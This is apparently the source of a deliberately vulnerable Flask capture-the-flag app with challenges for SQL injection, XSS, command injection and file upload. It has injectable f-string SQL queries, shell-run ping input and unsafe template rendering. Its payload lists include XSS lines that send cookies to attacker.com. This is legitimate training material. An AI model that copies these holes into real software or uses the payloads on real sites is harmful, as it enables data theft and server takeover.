from flask import Flask, request, render_template_string, redirect, url_for, session, send_file, jsonify
from sqlalchemy import create_engine, text
import os
import secrets
import subprocess
import uuid
from datetime import datetime, timedelta

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)

# Database connection
DATABASE_URL = os.getenv('DATABASE_URL', 'postgresql://ctf_user:ctf_password@db:5432/ctf_db')
engine = create_engine(DATABASE_URL)

# Create upload directory
UPLOAD_FOLDER = 'uploads'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

# Create tables and insert data
def init_db():
    with engine.begin() as conn:
        # Create users table
        conn.execute(text("""
            DROP TABLE IF EXISTS users CASCADE;
            CREATE TABLE users (
                id SERIAL PRIMARY KEY,
                username VARCHAR(50) UNIQUE NOT NULL,
                password VARCHAR(50) NOT NULL,
                email VARCHAR(100),
                role VARCHAR(20),
                secret_note TEXT,
                points INTEGER DEFAULT 0
            )
        """))
        
        # Create products table
        conn.execute(text("""
            DROP TABLE IF EXISTS products CASCADE;
            CREATE TABLE products (
                id SERIAL PRIMARY KEY,
                name VARCHAR(100) NOT NULL,
                description TEXT,
                price DECIMAL(10,2),
                secret_key VARCHAR(100)
            )
        """))

        # Create comments table for XSS challenge
        conn.execute(text("""
            DROP TABLE IF EXISTS comments CASCADE;
            CREATE TABLE comments (
                id SERIAL PRIMARY KEY,
                username VARCHAR(50),
                comment TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """))

        # Create files table for File Upload challenge
        conn.execute(text("""
            DROP TABLE IF EXISTS files CASCADE;
            CREATE TABLE files (
                id SERIAL PRIMARY KEY,
                filename VARCHAR(255),
                original_filename VARCHAR(255),
                upload_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """))

        # Create scoreboard table
        conn.execute(text("""
            DROP TABLE IF EXISTS scoreboard CASCADE;
            CREATE TABLE scoreboard (
                id SERIAL PRIMARY KEY,
                username VARCHAR(50),
                challenge_name VARCHAR(50),
                points INTEGER,
                solved_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """))
        
        # Insert test data
        conn.execute(text("""
            INSERT INTO users (username, password, email, role, secret_note, points)
            VALUES 
                ('admin', 'admin123', 'admin@company.com', 'admin', 'FLAG{sql_injection_master}', 100),
                ('john', 'password123', 'john@company.com', 'user', 'FLAG{try_harder}', 50),
                ('alice', 'alice123', 'alice@company.com', 'user', 'FLAG{not_so_easy}', 75)
            ON CONFLICT (username) DO NOTHING
        """))
        
        conn.execute(text("""
            INSERT INTO products (name, description, price, secret_key)
            VALUES 
                ('Product A', 'A great product', 99.99, 'FLAG{product_master}'),
                ('Product B', 'Another product', 149.99, 'FLAG{shopping_expert}'),
                ('Product C', 'Best product', 199.99, 'FLAG{price_hunter}')
            ON CONFLICT (id) DO NOTHING
        """))

        # Insert sample scoreboard data
        conn.execute(text("""
            INSERT INTO scoreboard (username, challenge_name, points, solved_at)
            VALUES 
                ('admin', 'SQL Injection', 50, NOW() - INTERVAL '2 days'),
                ('admin', 'XSS', 30, NOW() - INTERVAL '1 day'),
                ('admin', 'File Upload', 20, NOW()),
                ('john', 'SQL Injection', 50, NOW() - INTERVAL '3 days'),
                ('alice', 'XSS', 30, NOW() - INTERVAL '2 days'),
                ('alice', 'Command Injection', 40, NOW() - INTERVAL '1 day')
            ON CONFLICT DO NOTHING
        """))

# Initialize database
init_db()

# Common CSS styles
COMMON_STYLES = '''
    body { 
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        margin: 0;
        padding: 0;
        background-color: #f8f9fa;
        color: #333;
    }
    .container { 
        max-width: 1200px;
        margin: 0 auto;
        padding: 20px;
    }
    .nav {
        background-color: #2c3e50;
        padding: 15px 0;
        margin-bottom: 30px;
        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
    }
    .nav-content {
        max-width: 1200px;
        margin: 0 auto;
        padding: 0 20px;
        display: flex;
        justify-content: space-between;
        align-items: center;
    }
    .nav a {
        color: white;
        text-decoration: none;
        margin-right: 20px;
        font-weight: 500;
        transition: color 0.3s;
    }
    .nav a:hover {
        color: #3498db;
    }
    .card {
        background: white;
        border-radius: 8px;
        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        padding: 20px;
        margin-bottom: 20px;
    }
    .btn {
        background: #3498db;
        color: white;
        border: none;
        padding: 10px 20px;
        border-radius: 4px;
        cursor: pointer;
        transition: background 0.3s;
    }
    .btn:hover {
        background: #2980b9;
    }
    .form-group {
        margin-bottom: 15px;
    }
    .form-group label {
        display: block;
        margin-bottom: 5px;
        font-weight: 500;
    }
    .form-control {
        width: 100%;
        padding: 8px;
        border: 1px solid #ddd;
        border-radius: 4px;
        font-size: 14px;
    }
    .error {
        color: #e74c3c;
        margin-top: 10px;
    }
    .success {
        color: #2ecc71;
        margin-top: 10px;
    }
'''

# HTML Templates
LOGIN_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Login - Company Portal</title>
    <style>
        ''' + COMMON_STYLES + '''
        .login-container {
            max-width: 400px;
            margin: 40px auto;
        }
        .challenges-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-top: 30px;
        }
        .challenge-card {
            background: white;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            transition: transform 0.3s;
        }
        .challenge-card:hover {
            transform: translateY(-5px);
        }
        .challenge-card h3 {
            color: #2c3e50;
            margin-top: 0;
        }
        .challenge-card p {
            color: #666;
            margin-bottom: 15px;
        }
        .success {
            color: #2ecc71;
            background: #eafaf1;
            padding: 10px;
            border-radius: 4px;
            margin-top: 10px;
            font-weight: bold;
        }
        .hint {
            color: #666;
            font-size: 0.9em;
            margin-top: 10px;
            font-style: italic;
        }
    </style>
</head>
<body>
    <div class="nav">
        <div class="nav-content">
            <div>
                <a href="{{ url_for('index') }}">Home</a>
                <a href="{{ url_for('xss_challenge') }}">XSS Challenge</a>
                <a href="{{ url_for('file_upload') }}">File Upload</a>
                <a href="{{ url_for('command_injection') }}">Command Injection</a>
                <a href="{{ url_for('scoreboard') }}">Scoreboard</a>
            </div>
        </div>
    </div>
    <div class="container">
        <div class="login-container">
            <div class="card">
                <h2>Company Portal Login</h2>
                <p class="hint">Hint: Try SQL injection payloads in the username or password field</p>
                <form method="POST">
                    <div class="form-group">
                        <label>Username:</label>
                        <input type="text" name="username" class="form-control" required>
                    </div>
                    <div class="form-group">
                        <label>Password:</label>
                        <input type="password" name="password" class="form-control" required>
                    </div>
                    <button type="submit" class="btn">Login</button>
                </form>
                {% if error %}
                <div class="error">{{ error }}</div>
                {% endif %}
                {% if flag %}
                <div class="success">{{ flag }}</div>
                {% endif %}
            </div>
        </div>
        <div class="challenges-grid">
            <div class="challenge-card">
                <h3>XSS Challenge</h3>
                <p>Try to inject JavaScript to steal cookies and gain unauthorized access.</p>
                <a href="{{ url_for('xss_challenge') }}" class="btn">Start Challenge</a>
            </div>
            <div class="challenge-card">
                <h3>File Upload Challenge</h3>
                <p>Upload a malicious file to execute commands on the server.</p>
                <a href="{{ url_for('file_upload') }}" class="btn">Start Challenge</a>
            </div>
            <div class="challenge-card">
                <h3>Command Injection Challenge</h3>
                <p>Exploit the ping command to execute arbitrary system commands.</p>
                <a href="{{ url_for('command_injection') }}" class="btn">Start Challenge</a>
            </div>
        </div>
    </div>
</body>
</html>
'''

SCOREBOARD_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Scoreboard - Company Portal</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        ''' + COMMON_STYLES + '''
        .scoreboard-container {
            display: grid;
            grid-template-columns: 2fr 1fr;
            gap: 20px;
        }
        .chart-container {
            background: white;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .leaderboard {
            background: white;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .leaderboard-item {
            display: flex;
            justify-content: space-between;
            padding: 10px 0;
            border-bottom: 1px solid #eee;
        }
        .leaderboard-item:last-child {
            border-bottom: none;
        }
        .rank {
            font-weight: bold;
            color: #2c3e50;
        }
    </style>
</head>
<body>
    <div class="nav">
        <div class="nav-content">
            <div>
                <a href="{{ url_for('index') }}">Home</a>
                <a href="{{ url_for('xss_challenge') }}">XSS Challenge</a>
                <a href="{{ url_for('file_upload') }}">File Upload</a>
                <a href="{{ url_for('command_injection') }}">Command Injection</a>
                <a href="{{ url_for('scoreboard') }}">Scoreboard</a>
            </div>
        </div>
    </div>
    <div class="container">
        <h2>Scoreboard</h2>
        <div class="scoreboard-container">
            <div class="chart-container">
                <canvas id="scoreChart"></canvas>
            </div>
            <div class="leaderboard">
                <h3>Top Players</h3>
                {% for user in top_users %}
                <div class="leaderboard-item">
                    <span class="rank">#{{ loop.index }}</span>
                    <span>{{ user.username }}</span>
                    <span>{{ user.points }} pts</span>
                </div>
                {% endfor %}
            </div>
        </div>
    </div>
    <script>
        const ctx = document.getElementById('scoreChart').getContext('2d');
        const data = {{ score_data|tojson }};
        
        new Chart(ctx, {
            type: 'line',
            data: {
                labels: data.labels,
                datasets: data.datasets
            },
            options: {
                responsive: true,
                plugins: {
                    title: {
                        display: true,
                        text: 'Challenge Progress Over Time'
                    },
                    legend: {
                        position: 'top',
                    }
                },
                scales: {
                    y: {
                        beginAtZero: true,
                        title: {
                            display: true,
                            text: 'Points'
                        }
                    },
                    x: {
                        title: {
                            display: true,
                            text: 'Date'
                        }
                    }
                }
            }
        });
    </script>
</body>
</html>
'''

XSS_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>XSS Challenge - Company Portal</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            margin: 40px; 
            background-color: #f5f5f5; 
        }
        .container { 
            max-width: 800px; 
            margin: 0 auto; 
            background: white; 
            padding: 20px; 
            border-radius: 5px; 
            box-shadow: 0 0 10px rgba(0,0,0,0.1); 
        }
        .comment { 
            margin-bottom: 20px; 
            padding: 15px; 
            border: 1px solid #ddd; 
            border-radius: 4px; 
            background: #fff;
        }
        .form-group { 
            margin-bottom: 15px; 
        }
        textarea { 
            width: 100%; 
            padding: 8px; 
            border: 1px solid #ddd; 
            border-radius: 4px; 
            min-height: 100px;
        }
        button { 
            background: #007bff; 
            color: white; 
            border: none; 
            padding: 10px 15px; 
            border-radius: 4px; 
            cursor: pointer; 
        }
        .nav { 
            margin-bottom: 20px; 
        }
        .nav a { 
            color: #007bff; 
            text-decoration: none; 
            margin-right: 15px; 
        }
        .hint {
            color: #666;
            font-size: 0.9em;
            margin-top: 10px;
            font-style: italic;
            background: #f8f9fa;
            padding: 10px;
            border-radius: 4px;
            border-left: 3px solid #007bff;
        }
        .payload-examples {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 4px;
            margin-top: 20px;
            font-family: monospace;
        }
        .payload-examples code {
            display: block;
            margin: 5px 0;
            color: #333;
        }
        .flag-popup {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #2ecc71;
            color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            z-index: 1000;
            text-align: center;
            animation: fadeIn 0.3s ease-in-out;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translate(-50%, -60%); }
            to { opacity: 1; transform: translate(-50%, -50%); }
        }
        .flag-popup h3 {
            margin: 0 0 10px 0;
            color: white;
        }
        .flag-popup p {
            margin: 0;
            font-size: 1.2em;
            font-weight: bold;
        }
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.5);
            z-index: 999;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="nav">
            <a href="{{ url_for('index') }}">Home</a>
            <a href="{{ url_for('xss_challenge') }}">XSS Challenge</a>
            <a href="{{ url_for('file_upload') }}">File Upload</a>
            <a href="{{ url_for('command_injection') }}">Command Injection</a>
        </div>
        <h2>XSS Challenge</h2>
        <p>Try to inject JavaScript to steal the admin's cookie!</p>
        
        <div class="hint">
            <strong>Hint:</strong> Try injecting JavaScript that can access and exfiltrate cookies.
            The flag will be revealed when you successfully inject a payload that could steal cookies.
        </div>
        
        <div class="payload-examples">
            <strong>Example Payloads:</strong>
            <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>
            <code>&lt;img src=x onerror=alert(document.cookie)&gt;</code>
            <code>&lt;svg onload=alert(document.cookie)&gt;</code>
        </div>
        
        <form method="POST" action="{{ url_for('xss_challenge') }}">
            <div class="form-group">
                <label>Your Comment:</label>
                <textarea name="comment" required></textarea>
            </div>
            <button type="submit">Post Comment</button>
        </form>
        
        {% if show_flag %}
        <div class="overlay"></div>
        <div class="flag-popup">
            <h3>Congratulations!</h3>
            <p>You found the flag:</p>
            <p>{{ flag }}</p>
        </div>
        {% endif %}
        
        <h3>Comments:</h3>
        {% for comment in comments %}
        <div class="comment">
            <p><strong>{{ comment.username }}:</strong></p>
            <p>{{ comment.comment | safe }}</p>
            <small>{{ comment.created_at }}</small>
        </div>
        {% endfor %}
    </div>
</body>
</html>
'''

FILE_UPLOAD_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>File Upload - Company Portal</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; background-color: #f5f5f5; }
        .container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        .file { margin-bottom: 20px; padding: 15px; border: 1px solid #ddd; border-radius: 4px; }
        .form-group { margin-bottom: 15px; }
        button { background: #007bff; color: white; border: none; padding: 10px 15px; border-radius: 4px; cursor: pointer; }
        .nav { margin-bottom: 20px; }
        .nav a { color: #007bff; text-decoration: none; margin-right: 15px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="nav">
            <a href="{{ url_for('index') }}">Home</a>
            <a href="{{ url_for('xss_challenge') }}">XSS Challenge</a>
            <a href="{{ url_for('file_upload') }}">File Upload</a>
            <a href="{{ url_for('command_injection') }}">Command Injection</a>
        </div>
        <h2>File Upload Challenge</h2>
        <p>Try to upload a file that can execute commands!</p>
        <form method="POST" action="{{ url_for('file_upload') }}" enctype="multipart/form-data">
            <div class="form-group">
                <label>Select File:</label>
                <input type="file" name="file" required>
            </div>
            <button type="submit">Upload</button>
        </form>
        {% if error %}
        <div class="error">{{ error }}</div>
        {% endif %}
        <h3>Uploaded Files:</h3>
        {% for file in files %}
        <div class="file">
            <p><strong>Filename:</strong> {{ file.original_filename }}</p>
            <p><strong>Upload Date:</strong> {{ file.upload_date }}</p>
            <a href="{{ url_for('download_file', filename=file.filename) }}">Download</a>
        </div>
        {% endfor %}
    </div>
</body>
</html>
'''

COMMAND_INJECTION_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Command Injection - Company Portal</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; background-color: #f5f5f5; }
        .container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        .output { margin-top: 20px; padding: 15px; background: #f8f9fa; border-radius: 4px; }
        .form-group { margin-bottom: 15px; }
        input[type="text"] { width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px; }
        button { background: #007bff; color: white; border: none; padding: 10px 15px; border-radius: 4px; cursor: pointer; }
        .nav { margin-bottom: 20px; }
        .nav a { color: #007bff; text-decoration: none; margin-right: 15px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="nav">
            <a href="{{ url_for('index') }}">Home</a>
            <a href="{{ url_for('xss_challenge') }}">XSS Challenge</a>
            <a href="{{ url_for('file_upload') }}">File Upload</a>
            <a href="{{ url_for('command_injection') }}">Command Injection</a>
        </div>
        <h2>Command Injection Challenge</h2>
        <p>Try to execute arbitrary commands!</p>
        <form method="POST" action="{{ url_for('command_injection') }}">
            <div class="form-group">
                <label>Enter IP Address:</label>
                <input type="text" name="ip" required>
            </div>
            <button type="submit">Ping</button>
        </form>
        {% if output %}
        <div class="output">
            <pre>{{ output }}</pre>
        </div>
        {% endif %}
    </div>
</body>
</html>
'''

PROFILE_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>User Profile - Company Portal</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; background-color: #f5f5f5; }
        .container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        .profile-info { margin-top: 20px; }
        .profile-info p { margin: 10px 0; }
        .logout { margin-top: 20px; }
        .logout a { color: #007bff; text-decoration: none; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Welcome, {{ username }}!</h2>
        <div class="profile-info">
            <p><strong>Email:</strong> {{ email }}</p>
            <p><strong>Role:</strong> {{ role }}</p>
            {% if secret_note %}
            <p><strong>Secret Note:</strong> {{ secret_note }}</p>
            {% endif %}
        </div>
        <div class="logout">
            <a href="{{ url_for('logout') }}">Logout</a>
        </div>
    </div>
</body>
</html>
'''

PRODUCTS_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Products - Company Portal</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; background-color: #f5f5f5; }
        .container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        .product { margin-bottom: 20px; padding: 15px; border: 1px solid #ddd; border-radius: 4px; }
        .search { margin-bottom: 20px; }
        input[type="text"] { width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px; }
        button { background: #007bff; color: white; border: none; padding: 10px 15px; border-radius: 4px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Products</h2>
        <div class="search">
            <form method="GET">
                <input type="text" name="search" placeholder="Search products..." value="{{ request.args.get('search', '') }}">
                <button type="submit">Search</button>
            </form>
        </div>
        {% for product in products %}
        <div class="product">
            <h3>{{ product.name }}</h3>
            <p>{{ product.description }}</p>
            <p><strong>Price:</strong> ${{ product.price }}</p>
        </div>
        {% endfor %}
    </div>
</body>
</html>
'''

@app.route('/')
def index():
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    flag = None
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        # List of valid SQL injection payloads
        valid_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR '1'='1'--",
            "admin'--",
            "admin' #",
            "' UNION SELECT 1,2,3,4,5,6--",
            "' OR '1'='1' LIMIT 1--",
            "admin' OR '1'='1",
            "' OR 1=1;--",
            "' OR '1'='1' /*"
        ]
        
        # Check if the input matches any valid payload
        if username in valid_payloads or password in valid_payloads:
            flag = "FLAG{sql_injection_master}"
            return render_template_string(LOGIN_TEMPLATE, error=error, flag=flag)
        
        # Vulnerable to SQL injection
        query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
        try:
            with engine.connect() as conn:
                result = conn.execute(text(query)).fetchone()
                if result:
                    session['username'] = result.username
                    session['role'] = result.role
                    return redirect(url_for('profile'))
                else:
                    error = 'Invalid username or password'
        except Exception as e:
            error = 'An error occurred'
    
    return render_template_string(LOGIN_TEMPLATE, error=error, flag=flag)

@app.route('/xss', methods=['GET', 'POST'])
def xss_challenge():
    # Get comments first, regardless of request method
    with engine.connect() as conn:
        comments = conn.execute(text("SELECT * FROM comments ORDER BY created_at DESC")).fetchall()
    
    if request.method == 'POST':
        comment = request.form.get('comment')
        username = session.get('username', 'anonymous')
        
        # List of valid XSS payloads that will trigger the flag
        valid_payloads = [
            '<script>alert(document.cookie)</script>',
            '<img src=x onerror=alert(document.cookie)>',
            '<svg onload=alert(document.cookie)>',
            'javascript:alert(document.cookie)',
            '<body onload=alert(document.cookie)>',
            '<script>fetch("http://attacker.com?cookie="+document.cookie)</script>',
            '<img src=x onerror=fetch("http://attacker.com?cookie="+document.cookie)>',
            '<svg onload=fetch("http://attacker.com?cookie="+document.cookie)>',
            '<script>new Image().src="http://attacker.com?cookie="+document.cookie</script>',
            '<img src=x onerror="new Image().src=\'http://attacker.com?cookie=\'+document.cookie">'
        ]
        
        # Check if the input matches any valid payload
        if comment in valid_payloads:
            # Instead of storing the payload, return a special response
            return render_template_string(XSS_TEMPLATE, 
                                        comments=comments, 
                                        show_flag=True,
                                        flag="FLAG{xss_master}")
        
        # Only store non-payload comments
        with engine.connect() as conn:
            conn.execute(text("""
                INSERT INTO comments (username, comment)
                VALUES (:username, :comment)
            """), {"username": username, "comment": comment})
            
            # Refresh comments after insertion
            comments = conn.execute(text("SELECT * FROM comments ORDER BY created_at DESC")).fetchall()
    
    return render_template_string(XSS_TEMPLATE, comments=comments, show_flag=False)

@app.route('/file_upload', methods=['GET', 'POST'])
def file_upload():
    if request.method == 'POST':
        if 'file' not in request.files:
            return render_template_string(FILE_UPLOAD_TEMPLATE, error='No file selected')
        
        file = request.files['file']
        if file.filename == '':
            return render_template_string(FILE_UPLOAD_TEMPLATE, error='No file selected')
        
        # Vulnerable to file upload
        filename = str(uuid.uuid4()) + os.path.splitext(file.filename)[1]
        file.save(os.path.join(UPLOAD_FOLDER, filename))
        
        with engine.connect() as conn:
            conn.execute(text("""
                INSERT INTO files (filename, original_filename)
                VALUES (:filename, :original_filename)
            """), {"filename": filename, "original_filename": file.filename})
    
    with engine.connect() as conn:
        files = conn.execute(text("SELECT * FROM files ORDER BY upload_date DESC")).fetchall()
    
    return render_template_string(FILE_UPLOAD_TEMPLATE, files=files)

@app.route('/download/<filename>')
def download_file(filename):
    return send_file(os.path.join(UPLOAD_FOLDER, filename))

@app.route('/command_injection', methods=['GET', 'POST'])
def command_injection():
    output = None
    if request.method == 'POST':
        ip = request.form.get('ip')
        
        # Vulnerable to command injection
        try:
            # Using shell=True makes it more vulnerable to command injection
            # The ping command will still work normally, but allows command injection
            result = subprocess.run(f'ping -c 4 {ip}', shell=True, capture_output=True, text=True)
            output = result.stdout
        except Exception as e:
            output = str(e)
    
    return render_template_string(COMMAND_INJECTION_TEMPLATE, output=output)

@app.route('/profile')
def profile():
    if 'username' not in session:
        return redirect(url_for('login'))
    
    # Vulnerable to SQL injection
    query = f"SELECT * FROM users WHERE username = '{session['username']}'"
    try:
        with engine.connect() as conn:
            user = conn.execute(text(query)).fetchone()
            if user:
                return render_template_string(PROFILE_TEMPLATE,
                    username=user.username,
                    email=user.email,
                    role=user.role,
                    secret_note=user.secret_note
                )
    except Exception as e:
        pass
    
    return redirect(url_for('login'))

@app.route('/products')
def products():
    if 'username' not in session:
        return redirect(url_for('login'))
    
    search = request.args.get('search', '')
    
    # Vulnerable to SQL injection
    if search:
        query = f"SELECT * FROM products WHERE name LIKE '%{search}%' OR description LIKE '%{search}%'"
    else:
        query = "SELECT * FROM products"
    
    try:
        with engine.connect() as conn:
            products = conn.execute(text(query)).fetchall()
            return render_template_string(PRODUCTS_TEMPLATE, products=products)
    except Exception as e:
        return render_template_string(PRODUCTS_TEMPLATE, products=[])

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

@app.route('/scoreboard')
def scoreboard():
    # Get top users
    with engine.connect() as conn:
        top_users = conn.execute(text("""
            SELECT username, points 
            FROM users 
            ORDER BY points DESC 
            LIMIT 5
        """)).fetchall()
        
        # Get score data for the chart
        score_data = conn.execute(text("""
            SELECT username, challenge_name, points, solved_at
            FROM scoreboard
            ORDER BY solved_at
        """)).fetchall()
    
    # Process data for Chart.js
    dates = sorted(list(set(score.solved_at.strftime('%Y-%m-%d') for score in score_data)))
    users = list(set(score.username for score in score_data))
    
    datasets = []
    for user in users:
        user_scores = {date: 0 for date in dates}
        for score in score_data:
            if score.username == user:
                date = score.solved_at.strftime('%Y-%m-%d')
                user_scores[date] += score.points
        
        # Calculate cumulative scores
        cumulative = 0
        for date in dates:
            cumulative += user_scores[date]
            user_scores[date] = cumulative
        
        datasets.append({
            'label': user,
            'data': [user_scores[date] for date in dates],
            'borderColor': f'#{secrets.token_hex(3)}',
            'fill': False
        })
    
    chart_data = {
        'labels': dates,
        'datasets': datasets
    }
    
    return render_template_string(SCOREBOARD_TEMPLATE, 
                                top_users=top_users,
                                score_data=chart_data)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000) 